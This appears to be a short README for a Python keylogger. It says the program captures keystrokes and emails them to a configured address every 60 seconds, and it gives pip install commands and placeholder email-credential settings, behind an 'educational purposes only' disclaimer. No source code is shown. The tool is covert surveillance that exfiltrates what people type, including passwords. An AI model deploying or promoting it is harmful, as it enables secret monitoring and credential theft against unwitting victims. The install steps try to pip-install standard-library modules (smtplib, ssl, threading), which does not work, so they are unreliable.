# Keylogger with Email Notification:

This is a simple keylogger program for educational purposes. It logs keystrokes and sends the captured data to a specified email address every 60 seconds.

**Note:** This code is for educational purposes only. Unauthorized use of keyloggers is illegal and unethical.

## Prerequisites:

- Python 3.x

## Installation:
```sh
pip3 install smtplib
pip3 install ssl
pip3 install threading
pip3 install pynput
```
## Configuration:
Update Email Configuration

Open the keylogger.py file and update the following variables with your email details:
```sh
sender_email = "your_sender_mail_id"
password = "sender_mail_id_password"
receiver_email = "your_receiver_mail_id"
```
Ensure you use a secure method to store and access your email credentials, such as environment variables or a secure vault.


